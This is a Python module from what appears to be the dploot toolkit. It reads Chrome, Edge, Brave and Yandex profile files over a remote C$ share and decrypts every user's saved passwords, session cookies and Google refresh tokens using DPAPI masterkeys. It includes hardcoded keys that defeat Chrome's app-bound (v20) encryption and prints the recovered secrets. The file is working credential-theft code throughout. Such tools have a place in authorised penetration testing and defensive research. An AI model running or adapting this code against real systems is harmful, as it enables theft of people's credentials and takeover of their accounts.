import base64
from Cryptodome.Cipher import AES, ChaCha20_Poly1305
from binascii import hexlify
import hashlib
import json
import logging
import tempfile
import sqlite3
from typing import List, Tuple, Callable
from impacket.structure import Structure


from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.network import DPLootConnection
from dploot.lib.target import Target
from dploot.lib.masterkey import Masterkey
from dploot.lib.crypto import CHROME_KEY_DATA_BLOB, byte_xor, decrypt_chrome_password
from dploot.lib.utils import datetime_to_time
from dploot.triage import Triage
from dataclasses import dataclass


class APP_BOUND_KEY(Structure):
    def __init__(self, data=None, alignment=0):
        super().__init__(data, alignment)

        self.key = None
    
    structure = (
        ("PathLength", "<L=0"),
        ("_Path", "_-Path", 'self["PathLength"]'),
        ("Path", ":"),
        ("KeyLength", "<L=0"),
        ("_Key", "_-Key", 'self["KeyLength"]'),
        ("Key", ":"),
    )

    def dump(self):
        print("[APP BOUND KEY]")
        print("Path:\t%s" % (self["Path"]))
        print("Key:\t%s" % (hexlify(self["Key"])))

    def decrypt_key(self, cng_chromekey=None):
        if self.key is not None or self["Key"] is None:
            return self.key
        if len(self["Key"]) == 32:
            self.key = self["Key"]
        else: # from https://github.com/runassu/chrome_v20_decryption/blob/main/decrypt_chrome_v20_cookie.py
            aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
            chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
            xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
            
            flag = self["Key"][0]
            
            if flag == 1 or flag == 2:
                iv = self["Key"][1:13]
                encrypted_text = self["Key"][13:45]
                if flag == 1:
                    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
                elif flag == 2:
                    cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
            elif flag == 3 and cng_chromekey is not None:
                # Prepare the chromekey
                cng_chromekey = CHROME_KEY_DATA_BLOB(cng_chromekey)["Key"]

                encrypted_aes_key = self["Key"][1:33]
                iv = self["Key"][33:45]
                encrypted_text = self["Key"][45:77]
                                
                cipher = AES.new(cng_chromekey, AES.MODE_CBC, b"\x00" * 16)
                intermediate_key = cipher.decrypt(ciphertext=encrypted_aes_key)
                xored_intermediate_key = byte_xor(intermediate_key, xor_key)
                cipher = AES.new(xored_intermediate_key, AES.MODE_GCM, nonce=iv)
            else:
                if flag not in [1,2,3]:
                    raise ValueError(f"Unsupported flag: {flag}. Oops, Chrome did it again!")
                return None
            self.key = cipher.decrypt(ciphertext=encrypted_text)
        return self.key

class AppBoundKey:
    def __init__(self, dpapi_blob: bytes):
        self.dpapi_blob = dpapi_blob[4:] 
        self.app_bound_key = None

    @property
    def key(self):
        if self.app_bound_key is not None:
            return self.app_bound_key.decrypt_key()
        return None

    def decrypt(self, masterkeys:List[Masterkey], cng_chromekey) -> bool:
        masterkey = find_masterkey_for_blob(
                self.dpapi_blob, masterkeys=masterkeys
            )
        if masterkey is not None:
            intermediate_key = decrypt_blob(
                blob_bytes=self.dpapi_blob, masterkey=masterkey
            )
            masterkey = find_masterkey_for_blob(
                intermediate_key, masterkeys=masterkeys
            )
            if masterkey:
                self.app_bound_key = APP_BOUND_KEY(decrypt_blob(
                    blob_bytes=intermediate_key, masterkey=masterkey
                )).decrypt_key(cng_chromekey=cng_chromekey)
                return self.app_bound_key is not None
        return False

class AesStateKey:
    def __init__(self, dpapi_blob: bytes):
        self.dpapi_blob = dpapi_blob[5:]
        self.aeskey = None

    def decrypt(self, masterkeys:List[Masterkey]) -> bool:
        masterkey = find_masterkey_for_blob(
            self.dpapi_blob, masterkeys=masterkeys
        )
        if masterkey is not None:
            self.aeskey = decrypt_blob(
                blob_bytes=self.dpapi_blob, masterkey=masterkey
            )
            return True
        return False

class LoginData:
    def __init__(self, winuser:str, browser:str, url:str, username:str, encrypted_password:bytes, password:str = None):
        self.winuser = winuser
        self.browser = browser
        self.url = url
        self.username = username
        self.encrypted_password = encrypted_password
        self.password = password

    def dump(self) -> None:
        print("[%s LOGIN DATA]" % self.browser.upper())
        print("URL:\t\t%s" % self.url)
        print("Username:\t%s" % self.username)
        if self.password is not None:
            print("Password:\t%s" % self.password)
        print()

    def dump_quiet(self) -> None:
        print(
            f"[{self.browser.upper()}] {self.url} - {self.username}:{self.password}"
        )

    def decrypt(self, aeskey:bytes, app_bound_key:bytes, header:bytes = b''):
        try:
            if self.encrypted_password[:3] == b"v20":
                if app_bound_key is not None:
                    self.password = decrypt_chrome_password(
                    self.encrypted_password, app_bound_key, header
                    ).decode("latin-1")
            else:
                self.password = decrypt_chrome_password(
                self.encrypted_password, aeskey, header
                ).decode("latin-1")
        except Exception as e:
            logging.debug(f"Could not decrypt password: {e}")
        return self.password is not None

class Cookie:
    def __init__(
        self,
        winuser: str,
        browser: str,
        host: str,
        path: str,
        cookie_name: str,
        creation_utc: str,
        expires_utc: str,
        last_access_utc: str,
        encrypted_cookie_value: str,
        cookie_value: str = None,
        ):
        self.winuser = winuser
        self.browser = browser
        self.host = host
        self.path = path
        self.cookie_name = cookie_name
        self.encrypted_cookie_value = encrypted_cookie_value
        self.creation_utc = creation_utc
        self.expires_utc = expires_utc
        self.last_access_utc = last_access_utc
        self.cookie_value = cookie_value

    def dump(self) -> None:
        print("[%s COOKIE DATA]" % self.browser.upper())
        print(f"Host (path):\t\t{self.host} ({self.path})")
        print("Cookie Name:\t\t%s" % self.cookie_name)
        if self.cookie_value is not None:
            print("Cookie Value:\t\t%s" % self.cookie_value)
        print("Creation UTC:\t\t%s" % datetime_to_time(self.creation_utc))
        print("Expires UTC:\t\t%s" % datetime_to_time(self.expires_utc))
        print("Last Access UTC:\t%s" % datetime_to_time(self.last_access_utc))
        print()

    def dump_quiet(self) -> None:
        print(
            f"[{self.browser.upper()}] {self.host}{self.path} - {self.cookie_name}:{self.cookie_value}"
        )

    def decrypt(self, aeskey:bytes, app_bound_key:bytes):
        try:
            if self.encrypted_cookie_value[:3] == b"v20":
                if app_bound_key is not None:
                    self.cookie_value = decrypt_chrome_password(
                    self.encrypted_cookie_value, app_bound_key
                    )[32:].decode("utf-8")
            else:
                self.cookie_value = decrypt_chrome_password(
                self.encrypted_cookie_value, aeskey
                )[32:].decode("utf-8")
        except Exception as e:
            print(self.cookie_value)
            logging.debug(f"Could not decrypt cookies: {e}")

        return self.cookie_value is not None


@dataclass
class GoogleRefreshToken:
    def __init__(self, winuser:str, browser:str, service:str, encrypted_token:str, token:str = None):
        self.winuser = winuser
        self.browser = browser
        self.service = service
        self.encrypted_token = encrypted_token
        self.token = token

    def dump(self) -> None:
        print("[%s - GOOGLE REFRESH TOKEN]" % self.browser.upper())
        print("Service:\t%s" % self.service)
        print("Token:\t\t%s" % self.token)
        print()

    def dump_quiet(self) -> None:
        print(f"[{self.browser.upper()}] GRT {self.service}:{self.token}")

    def decrypt(self, aeskey) -> bool:
        self.token = decrypt_chrome_password(self.encrypted_token, aeskey).decode("utf-8")
        return self.token is not None

class BrowserTriage(Triage):
    user_google_chrome_generic_login_path = {
        "aesStateKeyPath": "Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
        "loginDataPath": "Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\%s\\Login Data",
        "webDataPath": "Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\%s\\Web Data",
        "cookiesDataPath": [
            "Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\%s\\Cookies",
            "Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\%s\\Network\\Cookies",
        ],
    }
    user_msedge_generic_login_path = {
        "aesStateKeyPath": "Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State",
        "loginDataPath": "Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\%s\\Login Data",
        "webDataPath": "Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\%s\\Web Data",
        "cookiesDataPath": [
            "Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\%s\\Cookies",
            "Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\%s\\Network\\Cookies",
        ],
    }
    user_brave_generic_login_path = {
        "aesStateKeyPath": "Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
        "loginDataPath": "Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\%s\\Login Data",
        "webDataPath": "Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\%s\\Web Data",
        "cookiesDataPath": [
            "Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\%s\\Cookies",
            "Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\%s\\Network\\Cookies",
        ],
    }
    user_yandex_generic_login_path = {
        "aesStateKeyPath": "Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State",
        "loginDataPath": "Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\%s\\Ya Passman Data",
        "webDataPath": "Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\%s\\Web Data",
        "cookiesDataPath": [
            "Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\%s\\Cookies",
            "Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\%s\\Network\\Cookies",
        ],
    }
    user_generic_chrome_paths = {
        "google chrome": user_google_chrome_generic_login_path,
        "msedge": user_msedge_generic_login_path,
        "brave": user_brave_generic_login_path,
        "yandex": user_yandex_generic_login_path,
    }

    share = "C$"
    
    def __init__(
        self,
        target: Target,
        conn: DPLootConnection,
        masterkeys: List[Masterkey],
        per_secret_callback: Callable = None,
        false_positive: List[str] | None = None,
    ) -> None:
        super().__init__(
            target, 
            conn, 
            masterkeys=masterkeys, 
            per_loot_callback=per_secret_callback, 
            false_positive=false_positive
        )
            
    def triage_browsers(
        self, gather_cookies: bool = False, bypass_shared_violation: bool = False, cng_chromekey: bytes = None
    ) -> Tuple[List[LoginData], List[Cookie]]:
        credentials = []
        cookies = []

        for user in self.users:
            try:
                user_credentials, user_cookies = self.triage_browsers_for_user(
                    user,
                    gather_cookies,
                    bypass_shared_violation=bypass_shared_violation,
                    cng_chromekey=cng_chromekey,
                )
                credentials += user_credentials
                cookies += user_cookies
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                    logging.debug(str(e))
        return credentials, cookies

    def triage_browsers_for_user(
        self,
        user: str,
        gather_cookies: bool = False,
        bypass_shared_violation: bool = False,
        cng_chromekey: bytes = None,
    ) -> Tuple[List[LoginData], List[Cookie]]:
        return self.triage_chrome_browsers_for_user(
            user=user,
            gather_cookies=gather_cookies,
            bypass_shared_violation=bypass_shared_violation,
            cng_chromekey=cng_chromekey,
        )

    def triage_chrome_browsers_for_user(
        self,
        user: str,
        gather_cookies: bool = False,
        bypass_shared_violation: bool = False,
        cng_chromekey: bytes = None,
    ) -> Tuple[List[LoginData], List[Cookie]]:
        credentials = []
        cookies = []
        profiles = ["Default"]
        for browser, paths in self.user_generic_chrome_paths.items():
            aeskey = None
            app_bound_key = None
            aesStateKey_bytes = self.conn.read_file(
                share=self.share,
                path=paths["aesStateKeyPath"] % user,
                bypass_shared_violation=bypass_shared_violation,
                looted_files=self.looted_files
            )
            if aesStateKey_bytes is not None and len(aesStateKey_bytes) > 0:
                logging.debug(
                    f"Found {browser.upper()} AppData files for user {user}"
                )
                aesStateKey_json = json.loads(aesStateKey_bytes)
                try:
                    blob = base64.b64decode(aesStateKey_json["os_crypt"]["encrypted_key"])
                    aeskey_obj = AesStateKey(blob)
                    if aeskey_obj.decrypt(masterkeys=self.masterkeys):
                        aeskey = aeskey_obj.aeskey
                        logging.debug(f"AesStateKey decrypted: {aeskey}")
                    if "app_bound_encrypted_key" in aesStateKey_json["os_crypt"]:
                        app_bound_blob = base64.b64decode(aesStateKey_json["os_crypt"]["app_bound_encrypted_key"])
                        app_bound_key_obj = AppBoundKey(app_bound_blob)
                        if app_bound_key_obj.decrypt(masterkeys=self.masterkeys, cng_chromekey=cng_chromekey):
                            app_bound_key = app_bound_key_obj.app_bound_key
                            logging.debug(f"AppBoundKey decrypted: {app_bound_key}")
                    profiles = aesStateKey_json["profile"]["profiles_order"]
                except KeyError as e:
                    logging.debug(f"Key not found! {e!r}")
                    # logging.debug(f"{aesStateKey_json=}")
                except ValueError as e:
                    logging.debug(f"ValueError: {e!r}")

            for profile in profiles:
                loginData_bytes = self.conn.read_file(
                    share=self.share,
                    path=paths["loginDataPath"] % (user,profile),
                    bypass_shared_violation=bypass_shared_violation,
                    looted_files=self.looted_files
                )
                if (
                    aeskey is not None
                    and loginData_bytes is not None
                    and len(loginData_bytes) > 0
                ):
                    fh = tempfile.NamedTemporaryFile()
                    fh.write(loginData_bytes)
                    fh.seek(0)
                    db = sqlite3.connect(fh.name)
                    cursor = db.cursor()
                    yandex_key = None

                    if browser == "yandex":
                        # from https://github.com/akhomlyuk/Ya_Decrypt
                        yandex_signature = b"\x08\x01\x12\x20"
                        cursor.execute("SELECT value FROM meta WHERE key='local_encryptor_data'")
                        blob = cursor.fetchone()[0]
                        ind = blob.find(b"v10")
                        encrypted_data = blob[ind:ind + 99]
                        decrypted_data = decrypt_chrome_password(encrypted_data, aeskey)
                        if not decrypted_data or not decrypted_data.startswith(yandex_signature):
                            continue
                        yandex_key = decrypted_data[len(yandex_signature):len(yandex_signature) + 32]
                        logging.debug(f"Yandex browser local_encryptor_data key retrieved: {yandex_key}")
                    
                    query = cursor.execute(
                        "SELECT origin_url, username_value, password_value, username_element, password_element, signon_realm FROM logins"
                    )
                    lines = query.fetchall()
                    if len(lines) > 0:
                        for url, username, encrypted_password, username_element, password_element, signon_realm in lines:
                            if encrypted_password == b"":
                                continue
                            
                            if browser == "yandex":
                                header = hashlib.sha1(( url + 
                                        "\x00" + username_element +
                                        "\x00" + username +
                                        "\x00" + password_element +
                                        "\x00" + signon_realm).encode("utf-8")
                                ).digest()
                                encrypted_password = b"v10"+encrypted_password
                            else:
                                header = b''

                            login_data = LoginData(
                                winuser=user,
                                browser=browser,
                                url=url,
                                username=username,
                                encrypted_password=encrypted_password,
                            )
                            
                            if login_data.decrypt(aeskey=aeskey if yandex_key is None else yandex_key, app_bound_key=app_bound_key, header=header):
                                credentials.append(login_data)
                                if self.per_loot_callback is not None:
                                    self.per_loot_callback(login_data)
                    fh.close()
                if gather_cookies:
                    for cookiepath in paths["cookiesDataPath"]:
                        cookiesData_bytes = self.conn.read_file(
                            share=self.share,
                            path=cookiepath % (user,profile),
                            bypass_shared_violation=bypass_shared_violation,
                            looted_files=self.looted_files
                        )
                        if (
                            aeskey is not None
                            and cookiesData_bytes is not None
                            and len(cookiesData_bytes) > 0
                        ):
                            fh = tempfile.NamedTemporaryFile()
                            fh.write(cookiesData_bytes)
                            fh.seek(0)
                            db = sqlite3.connect(fh.name)
                            cursor = db.cursor()
                            query = cursor.execute(
                                "SELECT creation_utc, host_key, name, path, expires_utc, last_access_utc, encrypted_value FROM cookies"
                            )
                            lines = query.fetchall()
                            if len(lines) > 0:
                                for (
                                    creation_utc,
                                    host,
                                    name,
                                    path,
                                    expires_utc,
                                    last_access_utc,
                                    encrypted_cookie,
                                ) in lines:
                                    cookie = Cookie(
                                        winuser=user,
                                        browser=browser,
                                        host=host,
                                        path=path,
                                        cookie_name=name,
                                        encrypted_cookie_value=encrypted_cookie,
                                        creation_utc=creation_utc,
                                        expires_utc=expires_utc,
                                        last_access_utc=last_access_utc,
                                    )
                                    if cookie.decrypt(aeskey=aeskey, app_bound_key=app_bound_key):
                                        cookies.append(cookie)
                                        if self.per_loot_callback is not None:
                                            self.per_loot_callback(cookie)
                            fh.close()
                webData_bytes = self.conn.read_file(
                    share=self.share,
                    path=paths["webDataPath"] % (user,profile),
                    bypass_shared_violation=bypass_shared_violation,
                    looted_files=self.looted_files
                )
                if (
                    aeskey is not None
                    and webData_bytes is not None
                    and len(webData_bytes) > 0
                ):
                    fh = tempfile.NamedTemporaryFile()
                    fh.write(webData_bytes)
                    fh.seek(0)
                    db = sqlite3.connect(fh.name)
                    cursor = db.cursor()
                    query = cursor.execute(
                        "SELECT service, encrypted_token FROM token_service"
                    )
                    lines = query.fetchall()
                    if len(lines) > 0:
                        for service, encrypted_grt in lines:
                            google_refresh_token = GoogleRefreshToken(
                                winuser=user, browser=browser, service=service, encrypted_token=encrypted_grt
                            )
                            if google_refresh_token.decrypt(aeskey=aeskey):
                                credentials.append(google_refresh_token)
                                if self.per_loot_callback is not None:
                                    self.per_loot_callback(google_refresh_token)
        return credentials, cookies
